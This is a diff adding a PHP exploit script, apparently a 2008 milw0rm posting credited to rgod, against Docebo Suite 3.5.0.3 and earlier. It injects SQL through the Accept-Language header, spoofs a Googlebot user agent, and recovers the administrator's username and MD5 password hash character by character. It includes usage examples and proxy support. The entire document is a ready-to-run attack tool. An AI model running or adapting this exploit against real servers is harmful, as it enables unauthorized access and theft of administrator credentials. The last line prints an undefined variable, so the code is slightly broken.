@@ -1,0 +1,168 @@
+<?php
+print_r('
+-----------------------------------------------------------------------------
+Docebo Suite <= 3.5.0.3 (lib.regset.php/non-blind) SQL injection exploit
+by rgod
+bug found by EgiX
+working with Mysql >= 4.1
+             PHP 5.X (needed by Docebo) regardless of php.ini settings
+             no benchmark()
+quickly coded to perform credentials disclosure
+-----------------------------------------------------------------------------
+');
+
+if ($argc<3) {
+print_r('
+-----------------------------------------------------------------------------
+Usage: php '.$argv[0].' host path OPTIONS
+host:      target server (ip/hostname)
+path:      path to docebo
+Options:
+ -p[port]:    specify a port other than 80
+ -P[ip:port]: specify a proxy
+Example:
+php '.$argv[0].' localhost /docebo/ -P1.1.1.1:80
+php '.$argv[0].' localhost /docebo/ -p81
+-----------------------------------------------------------------------------
+');
+die;
+}
+
+error_reporting(7);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$port=80;
+$proxy="";
+for ($i=3; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+//docebo changes the date separator according to the header 
+//es.: en -> /
+//     it -> -
+//so this is not a blind one, you can ask true-false questions and see
+//the separator
+
+$j=1;$admin="";
+while (!strstr($admin,chr(0)))
+{
+for ($i=0; $i<=255; $i++)
+{
+$sql="en%' AND ASCII(SUBSTR((SELECT userid FROM core_user WHERE idst=1011) FROM $j FOR 1))=$i/*";
+echo "query -> ".$sql."\n\n";
+$packet ="GET ".$p."doceboCms/ HTTP/1.0\r\n";
+$packet.="User-Agent: Googlebot/2.1\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Accept: text/plain\r\n";
+$packet.="Accept-Language: $sql\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+//2008 is the actual year, change it if you need
+if (!eregi('-2008',$html)) {$admin.=chr($i);echo "admin -> ".$admin."[???]\r\n";sleep(2);break;}
+if ($i==255) {die("Exploit failed...");}
+}
+
+$j++;
+}
+
+$md5s[0]=0;//null
+$md5s=array_merge($md5s,range(48,57)); //numbers
+$md5s=array_merge($md5s,range(97,102));//a-f letters
+$j=1;$password="";
+while (!strstr($password,chr(0)))
+{
+for ($i=0; $i<=255; $i++)
+{
+if (in_array($i,$md5s))
+{
+  $sql="en%' AND ASCII(SUBSTR((SELECT pass FROM core_user WHERE idst=1011) FROM $j FOR 1))=$i/*";
+  $packet ="GET ".$p."doceboCms/ HTTP/1.0\r\n";
+  $packet.="User-Agent: Googlebot/2.1\r\n";
+  $packet.="Host: ".$host."\r\n";
+  $packet.="Accept: text/plain\r\n";
+  $packet.="Accept-Language: $sql\r\n";
+  $packet.="Connection: Close\r\n\r\n";
+  sendpacketii($packet);
+  if (!eregi('-2008',$html)) {$password.=chr($i);echo "password -> ".$password."[???]\r\n";sleep(2);break;}
+}
+  if ($i==255) {die("Exploit failed...");}
+  }
+  $j++;
+}
+
+echo "admin:     ".$admin."\n";//remove slash when you login
+echo "md5 hash:  ".$pass."\n";
+?>
+
+# milw0rm.com [2008-01-11]
